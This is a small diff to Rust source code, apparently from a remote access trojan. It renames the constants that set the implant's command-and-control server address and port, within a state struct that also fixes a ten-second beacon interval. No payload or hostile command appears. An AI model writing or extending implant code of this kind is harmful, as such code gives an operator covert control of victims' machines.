@@ -141,8 +141,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut state = ImplantState {
         implant_id: generate_implant_id(),
         cadence: Duration::from_millis(10000),
-        server_location: String::from(rco_config::LISTENER_IP),
-        server_port: rco_config::LISTENER_PORT,
+        server_location: String::from(rco_config::RAT_SERVER_LOCATION),
+        server_port: rco_config::RAT_SERVER_PORT,
         command_number: 0
     };
     
